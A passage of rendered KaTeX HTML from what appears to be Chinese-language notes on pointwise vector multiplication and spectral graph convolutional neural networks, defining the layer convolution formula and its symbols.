aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>=</mo><mo stretchy=\"false\">[</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo stretchy=\"false\">]</mo><mspace linebreak=\"newline\"></mspace><mi>b</mi><mo>=</mo><mo stretchy=\"false\">[</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>b</mi><mn>3</mn></msub><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">a=[a_1,a_2,a_3]\\\\b=[b_1,b_2,b_3]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span></span></p>\n<p>它们的逐点乘积<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span></span></span></span> 为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>c</mi><mo>=</mo><mi>a</mi><mo>⊙</mo><mi>b</mi><mo>=</mo><mo stretchy=\"false\">[</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>3</mn></msub><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">c=a\\odot b=[a_1\\cdot b_1,a_2\\cdot b_2,a_3\\cdot b_3]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span></span></p>\n<h2 id=\"光谱图卷积神经网络\"><a class=\"anchor\" href=\"#光谱图卷积神经网络\">#</a> 光谱图卷积神经网络</h2>\n<p>光谱图卷积神经网络（Spectral Graph Convolutional Neural Network, Spectral Graph CNN）是一种将卷积神经网络（CNN）的概念推广到图结构数据的方法。它利用图傅里叶变换在频域中进行卷积操作，从而有效地处理非欧几里得数据，如社交网络、分子结构等。以下是对图中内容的详细解释。</p>\n<p>首先介绍光谱图卷积神经网络中第 k 层的卷积操作：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>x</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mi>h</mi><mrow><mo fence=\"true\">(</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>f</mi><mi>k</mi></msub></munderover><mi>U</mi><msub><mi>F</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub><msup><mi>U</mi><mi>T</mi></msup><msub><mi>x</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">x_{k+1,j}=h\\left(\\sum_{i=1}^{f_k}UF_{k,i,j}U^Tx_{k,i}\\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.16089em;vertical-align:-1.277669em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">(</span></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8832210000000003em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.347113em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15122857142857138em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">)</span></span></span></span></span></span></span></p>\n<p>其中：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">x_{k+1,j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>：第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">k+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 层中第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 个输出信号</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi></mrow><annotation encoding=\"application/x-tex\">h</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span></span></span></span>: 激活函数</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>f</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">f_k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层中的滤波器数量</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span>：图拉普拉斯矩阵的特征向量矩阵</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">F_{k,i,j}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>：第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层中的滤波器参数</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">x_{k,i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>：第 k 层中的第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 个输入信号</li>\n</ul>\n<p><strong>详细步骤</strong></p>\n<ul>\n<li>\n<p>图傅里叶变换：将第 k 层中的输入信号<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">x_{k,i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 转到频域</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mover 